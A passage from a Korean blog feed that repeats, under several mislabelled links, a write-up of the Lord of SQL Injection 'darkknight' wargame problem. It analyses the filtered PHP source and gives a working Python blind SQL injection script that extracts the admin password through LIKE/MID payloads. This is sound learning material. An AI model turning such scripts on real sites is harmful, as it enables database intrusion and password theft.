class="keyword">include</span> <span class="string">"./config.php"</span>;</span><br><span class="line">  login_chk();</span><br><span class="line">  dbconnect();</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\(\)/i'</span>, $_GET[no])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/\'/i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"HeHe"</span>);</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/\'|substr|ascii|=/i'</span>, $_GET[no])) <span class="keyword">exit</span>(<span class="string">"HeHe"</span>);</span><br><span class="line">  $query = <span class="string">"select id from prob_darkknight where id='guest' and pw='&#123;$_GET[pw]&#125;' and no=&#123;$_GET[no]&#125;"</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>;</span><br><span class="line">  $result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">'id'</span>]) <span class="keyword">echo</span> <span class="string">"&lt;h2&gt;Hello &#123;$result[id]&#125;&lt;/h2&gt;"</span>;</span><br><span class="line"></span><br><span class="line">  $_GET[pw] = addslashes($_GET[pw]);</span><br><span class="line">  $query = <span class="string">"select pw from prob_darkknight where id='admin' and pw='&#123;$_GET[pw]&#125;'"</span>;</span><br><span class="line">  $result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line">  <span class="keyword">if</span>(($result[<span class="string">'pw'</span>]) &amp;&amp; ($result[<span class="string">'pw'</span>] == $_GET[<span class="string">'pw'</span>])) solve(<span class="string">"darkknight"</span>);</span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="Filter"><a href="#Filter" class="headerlink" title="Filter"></a>Filter</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\(\)/i'</span>, $_GET[no])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/\'/i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"HeHe"</span>);</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/\'|substr|ascii|=/i'</span>, $_GET[no])) <span class="keyword">exit</span>(<span class="string">"HeHe"</span>);</span><br></pre></td></tr></table></figure><ul><li>GET 방식으로 <code>pw</code>를 받고, <code>pw</code>에 <code>prob</code>, <code>_</code>, <code>.</code>, <code>()</code> 가 들어 있으면 <code>No Hack ~_~</code>이 뜨고 문제 풀이에 실패한다.</li><li>또한, <strong>대소문자 구분 없이</strong> <code>pw</code>에 <code>&#39;</code> 가 들어 있으면 <code>HeHe</code>가 뜨고 문제 풀이에 실패한다.</li><li>또한, <strong>대소문자 구분 없이</strong> <code>no</code>에 <code>&#39;</code>, <code>substr</code>, <code>ascii</code>, <code>=</code> 이 들어 있으면 <code>HeHe</code>가 뜨고 문제 풀이에 실패한다.</li></ul><h4 id="Query"><a href="#Query" class="headerlink" title="Query"></a>Query</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$query = <span class="string">"select id from prob_darkknight where id='guest' and pw='&#123;$_GET[pw]&#125;' and no=&#123;$_GET[no]&#125;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>;</span><br><span class="line">$result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line"><span class="keyword">if</span>($result[<span class="string">'id'</span>]) <span class="keyword">echo</span> <span class="string">"&lt;h2&gt;Hello &#123;$result[id]&#125;&lt;/h2&gt;"</span>;</span><br><span class="line"></span><br><span class="line">$_GET[pw] = addslashes($_GET[pw]);</span><br><span class="line">$query = <span class="string">"select pw from prob_darkknight where id='admin' and pw='&#123;$_GET[pw]&#125;'"</span>;</span><br><span class="line">$result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line"><span class="keyword">if</span>(($result[<span class="string">'pw'</span>]) &amp;&amp; ($result[<span class="string">'pw'</span>] == $_GET[<span class="string">'pw'</span>])) solve(<span class="string">"darkknight"</span>);</span><br></pre></td></tr></table></figure><ul><li>받은 <code>pw</code>와 <code>no</code>가 직접 쿼리에 들어간다. 이것으로 SQL Injection 공격이 가능하다는 것을 알 수 있다.</li><li><code>$result[&#39;id&#39;]</code>에 참이 되는 어떤 값이든 들어 있으면 응답에 <code>&quot;Hello &quot;</code>와 <code>$result[id]</code> 값을 붙인 문자열이 포함된다.</li><li>문제 풀이가 성공하는 조건은 ‘데이터베이스에서 받은 <code>pw</code>와 GET방식으로 전달받은 <code>pw</code>가 같음’이다. 즉, 실제 데이터베이스에 저장된 <code>pw</code>를 알아내서 전달해야 한다.</li></ul><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><ol><li><p><code>MID</code> 함수, <code>LIKE</code> 활용</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line">key = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">pwlen = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">20</span>):</span><br><span class="line">    url = <span class="string">"http://los.eagle-jump.org/darkknight_f76e2eebfeeeec2b7699a9ae976f574d.php?no="</span></span><br><span class="line">    data = <span class="string">"-1 || length(pw) LIKE &#123;&#125;#"</span>.format(str(i)) <span class="comment"># = 을 못쓰므로 LIKE 로 수정</span></span><br><span class="line">    print(data)</span><br><span class="line">    data = quote(data)</span><br><span class="line">    re = urllib.request.Request(url + data)</span><br><span class="line"></span><br><span class="line">    re.add_header(</span><br><span class="line">        <span class="string">"User-agent"</span>, <span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"</span>)</span><br><span class="line">    re.add_header(</span><br><span class="line">        <span class="string">"Cookie"</span>, <span class="string">"PHPSESSID=bb9ultdedrmse87p4473hmms81"</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    req = urllib.request.urlopen(re)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> str(req.read()).find(<span class="string">"Hello admin"</span>) != <span class="number">-1</span>:</span><br><span class="line">        pwlen = i</span><br><span class="line">        print(<span class="string">'pw length : '</span> + str(pwlen))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, pwlen + <span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>, <span class="number">127</span>):</span><br><span class="line">        <span class="keyword">if</span> (chr(j) == <span class="string">'%'</span> <span class="keyword">or</span> chr(j) == <span class="string">'_'</span>): <span class="comment"># LIKE 를 사용하므로 와일드카드인 %와 _는 제외</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        url = <span class="string">"http://los.eagle-jump.org/darkknight_f76e2eebfeeeec2b7699a9ae976f574d.php?no="</span></span><br><span class="line">        data = <span class="string">'-1 || MID(pw, 1, &#123;&#125;) LIKE "&#123;&#125;"#'</span>.format( <span class="comment"># or, and 를 ||, &amp;&amp; 로 수정, MID 함수 사용, = 을 LIKE 로 수정, ' 를 "로 수정</span></span><br><span class="line">            str(i), key + chr(j))</span><br><span class="line">        print(data)</span><br><span class="line">        data = quote(data)</span><br><span class="line">        re = urllib.request.Request(url + data)</span><br><span class="line"></span><br><span class="line">        re.add_header(</span><br><span class="line">            <span class="string">"User-agent"</span>, <span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"</span>)</span><br><span class="line">        re.add_header(</span><br><span class="line">            <span class="string">"Cookie"</span>, <span class="string">"PHPSESSID=bb9ultdedrmse87p4473hmms81"</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        req = urllib.request.urlopen(re)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> str(req.read()).find(<span class="string">"Hello admin"</span>) != <span class="number">-1</span>:</span><br><span class="line">            key += chr(j).lower()</span><br><span class="line">            print(key)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(key)</span><br></pre></td></tr></table></figure><p>이러한 코드를 실행하면 결과값으로 <code>1c62ba6f</code> 를 출력한다.<br>이를 GET 방식으로 <code>pw</code>의 값으로 전달하면 풀린다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://los.eagle-jump.org/darkknight_f76e2eebfeeeec2b7699a9ae976f574d.php?pw=1c62ba6f</span><br></pre></td></tr></table></figure></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;개요&quot;&gt;&lt;a href=&quot;#개요&quot; class=&quot;headerlink&quot; title=&quot;개요&quot;&gt;&lt;/a&gt;개요&lt;/h2&gt;&lt;img src=&quot;/image/los-main.png&quot; width=&quot;300&quot;&gt;

&lt;p&gt;SQL Injection에 대한 지식을 쌓기 위해 &lt;a href=&quot;https://los.eagle-jump.org/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Lord of SQL Injection 사이트&lt;/a&gt;의 문제를 풀고 해답을 정리한다.&lt;/p&gt;
&lt;p&gt;이 문서에서는 Lord of SQL Injection 12번 darkknight 문제에 대하여 정리한다.&lt;/p&gt;
    
    </summary>
    
      <category term="Write Up" scheme="https://www.jslee.me/categories/Write-Up/"/>
    
    
      <category term="Lord of SQL Injection" scheme="https://www.jslee.me/tags/Lord-of-SQL-Injection/"/>
    
      <category term="Infosec" scheme="https://www.jslee.me/tags/Infosec/"/>
    
  </entry>
  
  <entry>
    <title>Lord of SQL Injection Write Up No.12 Darkknight</title>
    <link href="https://www.jslee.me/2019/08/23/los-write-up-20-dragon/"/>
    <id>https://www.jslee.me/2019/08/23/los-write-up-20-dragon/</id>
    <published>2019-08-23T01:28:26.000Z</published>
    <updated>2019-09-09T05:38:15.608Z</updated>
    
    <content type="html"><![CDATA[<h2 id="개요"><a href="#개요" class="headerlink" title="개요"></a>개요</h2><img src="/image/los-main.png" width="300"><p>SQL Injection에 대한 지식을 쌓기 위해 <a href="https://los.eagle-jump.org/" target="_blank" rel="noopener">Lord of SQL Injection 사이트</a>의 문제를 풀고 해답을 정리한다.</p><p>이 문서에서는 Lord of SQL Injection 12번 darkknight 문제에 대하여 정리한다.</p><a id="more"></a><h2 id="문제-분석"><a href="#문제-분석" class="headerlink" title="문제 분석"></a>문제 분석</h2><h3 id="문제-출제-의도"><a href="#문제-출제-의도" class="headerlink" title="문제 출제 의도"></a>문제 출제 의도</h3><p><code>&#39;</code>, <code>substr</code>, <code>ascii</code>, <code>=</code>을 대소문자 구분 없이 포함하지 않고 Blind SQL Injection을 하여 <code>pw</code>를 알아낼 수 있는지 확인한다.</p><h3 id="소스-코드-분석"><a href="#소스-코드-분석" class="headerlink" title="소스 코드 분석"></a>소스 코드 분석</h3><p>darkknight 문제의 php 소스 코드는 다음과 같다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">"./config.php"</span>;</span><br><span class="line">  login_chk();</span><br><span class="line">  dbconnect();</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\(\)/i'</span>, $_GET[no])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/\'/i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"HeHe"</span>);</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/\'|substr|ascii|=/i'</span>, $_GET[no])) <span class="keyword">exit</span>(<span class="string">"HeHe"</span>);</span><br><span class="line">  $query = <span class="string">"select id from prob_darkknight where id='guest' and pw='&#123;$_GET[pw]&#125;' and no=&#123;$_GET[no]&#125;"</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>;</span><br><span class="line">  $result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">'id'</span>]) <span class="keyword">echo</span> <span class="string">"&lt;h2&gt;Hello &#123;$result[id]&#125;&lt;/h2&gt;"</span>;</span><br><span class="line"></span><br><span class="line">  $_GET[pw] = addslashes($_GET[pw]);</span><br><span class="line">  $query = <span class="string">"select pw from prob_darkknight where id='admin' and pw='&#123;$_GET[pw]&#125;'"</span>;</span><br><span class="line">  $result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line">  <span class="keyword">if</span>(($result[<span class="string">'pw'</span>]) &amp;&amp; ($result[<span class="string">'pw'</span>] == $_GET[<span class="string">'pw'</span>])) solve(<span class="string">"darkknight"</span>);</span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="Filter"><a href="#Filter" class="headerlink" title="Filter"></a>Filter</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\(\)/i'</span>, $_GET[no])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/\'/i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"HeHe"</span>);</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/\'|substr|ascii|=/i'</span>, $_GET[no])) <span class="keyword">exit</span>(<span class="string">"HeHe"</span>);</span><br></pre></td></tr></table></figure><ul><li>GET 방식으로 <code>pw</code>를 받고, <code>pw</code>에 <code>prob</code>, <code>_</code>, <code>.</code>, <code>()</code> 가 들어 있으면 <code>No Hack ~_~</code>이 뜨고 문제 풀이에 실패한다.</li><li>또한, <strong>대소문자 구분 없이</strong> <code>pw</code>에 <code>&#39;</code> 가 들어 있으면 <code>HeHe</code>가 뜨고 문제 풀이에 실패한다.</li><li>또한, <strong>대소문자 구분 없이</strong> <code>no</code>에 <code>&#39;</code>, <code>substr</code>, <code>ascii</code>, <code>=</code> 이 들어 있으면 <code>HeHe</code>가 뜨고 문제 풀이에 실패한다.</li></ul><h4 id="Query"><a href="#Query" class="headerlink" title="Query"></a>Query</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$query = <span class="string">"select id from prob_darkknight where id='guest' and pw='&#123;$_GET[pw]&#125;' and no=&#123;$_GET[no]&#125;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>;</span><br><span class="line">$result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line"><span class="keyword">if</span>($result[<span class="string">'id'</span>]) <span class="keyword">echo</span> <span class="string">"&lt;h2&gt;Hello &#123;$result[id]&#125;&lt;/h2&gt;"</span>;</span><br><span class="line"></span><br><span class="line">$_GET[pw] = addslashes($_GET[pw]);</span><br><span class="line">$query = <span class="string">"select pw from prob_darkknight where id='admin' and pw='&#123;$_GET[pw]&#125;'"</span>;</span><br><span class="line">$result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line"><span class="keyword">if</span>(($result[<span class="string">'pw'</span>]) &amp;&amp; ($result[<span class="string">'pw'</span>] == $_GET[<span class="string">'pw'</span>])) solve(<span class="string">"darkknight"</span>);</span><br></pre></td></tr></table></figure><ul><li>받은 <code>pw</code>와 <code>no</code>가 직접 쿼리에 들어간다. 이것으로 SQL Injection 공격이 가능하다는 것을 알 수 있다.</li><li><code>$result[&#39;id&#39;]</code>에 참이 되는 어떤 값이든 들어 있으면 응답에 <code>&quot;Hello &quot;</code>와 <code>$result[id]</code> 값을 붙인 문자열이 포함된다.</li><li>문제 풀이가 성공하는 조건은 ‘데이터베이스에서 받은 <code>pw</code>와 GET방식으로 전달받은 <code>pw</code>가 같음’이다. 즉, 실제 데이터베이스에 저장된 <code>pw</code>를 알아내서 전달해야 한다.</li></ul><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><ol><li><p><code>MID</code> 함수, <code>LIKE</code> 활용</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line">key = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">pwlen = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">20</span>):</span><br><span class="line">    url = <span class="string">"http://los.eagle-jump.org/darkknight_f76e2eebfeeeec2b7699a9ae976f574d.php?no="</span></span><br><span class="line">    data = <span class="string">"-1 || length(pw) LIKE &#123;&#125;#"</span>.format(str(i)) <span class="comment"># = 을 못쓰므로 LIKE 로 수정</span></span><br><span class="line">    print(data)</span><br><span class="line">    data = quote(data)</span><br><span class="line">    re = urllib.request.Request(url + data)</span><br><span class="line"></span><br><span class="line">    re.add_header(</span><br><span class="line">        <span class="string">"User-agent"</span>, <span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"</span>)</span><br><span class="line">    re.add_header(</span><br><span class="line">        <span class="string">"Cookie"</span>, <span class="string">"PHPSESSID=bb9ultdedrmse87p4473hmms81"</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    req = urllib.request.urlopen(re)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> str(req.read()).find(<span class="string">"Hello admin"</span>) != <span class="number">-1</span>:</span><br><span class="line">        pwlen = i</span><br><span class="line">        print(<span class="string">'pw length : '</span> + str(pwlen))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, pwlen + <span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>, <span class="number">127</span>):</span><br><span class="line">        <span class="keyword">if</span> (chr(j) == <span class="string">'%'</span> <span class="keyword">or</span> chr(j) == <span class="string">'_'</span>): <span class="comment"># LIKE 를 사용하므로 와일드카드인 %와 _는 제외</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        url = <span class="string">"http://los.eagle-jump.org/darkknight_f76e2eebfeeeec2b7699a9ae976f574d.php?no="</span></span><br><span class="line">        data = <span class="string">'-1 || MID(pw, 1, &#123;&#125;) LIKE "&#123;&#125;"#'</span>.format( <span class="comment"># or, and 를 ||, &amp;&amp; 로 수정, MID 함수 사용, = 을 LIKE 로 수정, ' 를 "로 수정</span></span><br><span class="line">            str(i), key + chr(j))</span><br><span class="line">        print(data)</span><br><span class="line">        data = quote(data)</span><br><span class="line">        re = urllib.request.Request(url + data)</span><br><span class="line"></span><br><span class="line">        re.add_header(</span><br><span class="line">            <span class="string">"User-agent"</span>, <span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"</span>)</span><br><span class="line">        re.add_header(</span><br><span class="line">            <span class="string">"Cookie"</span>, <span class="string">"PHPSESSID=bb9ultdedrmse87p4473hmms81"</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        req = urllib.request.urlopen(re)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> str(req.read()).find(<span class="string">"Hello admin"</span>) != <span class="number">-1</span>:</span><br><span class="line">            key += chr(j).lower()</span><br><span class="line">            print(key)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(key)</span><br></pre></td></tr></table></figure><p>이러한 코드를 실행하면 결과값으로 <code>1c62ba6f</code> 를 출력한다.<br>이를 GET 방식으로 <code>pw</code>의 값으로 전달하면 풀린다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://los.eagle-jump.org/darkknight_f76e2eebfeeeec2b7699a9ae976f574d.php?pw=1c62ba6f</span><br></pre></td></tr></table></figure></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;개요&quot;&gt;&lt;a href=&quot;#개요&quot; class=&quot;headerlink&quot; title=&quot;개요&quot;&gt;&lt;/a&gt;개요&lt;/h2&gt;&lt;img src=&quot;/image/los-main.png&quot; width=&quot;300&quot;&gt;

&lt;p&gt;SQL Injection에 대한 지식을 쌓기 위해 &lt;a href=&quot;https://los.eagle-jump.org/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Lord of SQL Injection 사이트&lt;/a&gt;의 문제를 풀고 해답을 정리한다.&lt;/p&gt;
&lt;p&gt;이 문서에서는 Lord of SQL Injection 12번 darkknight 문제에 대하여 정리한다.&lt;/p&gt;
    
    </summary>
    
      <category term="Write Up" scheme="https://www.jslee.me/categories/Write-Up/"/>
    
    
      <category term="Lord of SQL Injection" scheme="https://www.jslee.me/tags/Lord-of-SQL-Injection/"/>
    
      <category term="Infosec" scheme="https://www.jslee.me/tags/Infosec/"/>
    
  </entry>
  
  <entry>
    <title>Lord of SQL Injection Write Up No.12 Darkknight</title>
    <link href="https://www.jslee.me/2019/08/23/los-write-up-19-xavis/"/>
    <id>https://www.jslee.me/2019/08/23/los-write-up-19-xavis/</id>
    <published>2019-08-23T01:28:26.000Z</published>
    <updated>2019-09-09T05:38:15.608Z</updated>
    
    <content type="html"><![CDATA[<h2 id="개요"><a href="#개요" class="headerlink" title="개요"></a>개요</h2><img src="/image/los-main.png" width="300"><p>SQL Injection에 대한 지식을 쌓기 위해 <a href="https://los.eagle-jump.org/" target="_blank" rel="noopener">Lord of SQL Injection 사이트</a>의 문제를 풀고 해답을 정리한다.</p><p>이 문서에서는 Lord of SQL Injection 12번 darkknight 문제에 대하여 정리한다.</p><a id="more"></a><h2 id="문제-분석"><a href="#문제-분석" class="headerlink" title="문제 분석"></a>문제 분석</h2><h3 id="문제-출제-의도"><a href="#문제-출제-의도" class="headerlink" title="문제 출제 의도"></a>문제 출제 의도</h3><p><code>&#39;</code>, <code>substr</code>, <code>ascii</code>, <code>=</code>을 대소문자 구분 없이 포함하지 않고 Blind SQL Injection을 하여 <code>pw</code>를 알아낼 수 있는지 확인한다.</p><h3 id="소스-코드-분석"><a href="#소스-코드-분석" class="headerlink" title="소스 코드 분석"></a>소스 코드 분석</h3><p>darkknight 문제의 php 소스 코드는 다음과 같다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">"./config.php"</span>;</span><br><span class="line">  login_chk();</span><br><span class="line">  dbconnect();</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\(\)/i'</span>, $_GET[no])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/\'/i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"HeHe"</span>);</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/\'|substr|ascii|=/i'</span>, $_GET[no])) <span class="keyword">exit</span>(<span class="string">"HeHe"</span>);</span><br><span class="line">  $query = <span class="string">"select id from prob_darkknight where id='guest' and pw='&#123;$_GET[pw]&#125;' and no=&#123;$_GET[no]&#125;"</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>;</span><br><span class="line">  $result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">'id'</span>]) <span class="keyword">echo</span> <span class="string">"&lt;h2&gt;Hello &#123;$result[id]&#125;&lt;/h2&gt;"</span>;</span><br><span class="line"></span><br><span class="line">  $_GET[pw] = addslashes($_GET[pw]);</span><br><span class="line">  $query = <span class="string">"select pw from prob_darkknight where id='admin' and pw='&#123;$_GET[pw]&#125;'"</span>;</span><br><span class="line">  $result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line">  <span class="keyword">if</span>(($result[<span class="string">'pw'</span>]) &amp;&amp; ($result[<span class="string">'pw'</span>] == $_GET[<span class="string">'pw'</span>])) solve(<span class="string">"darkknight"</span>);</span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="Filter"><a href="#Filter" class="headerlink" title="Filter"></a>Filter</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\(\)/i'</span>, $_GET[no])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span 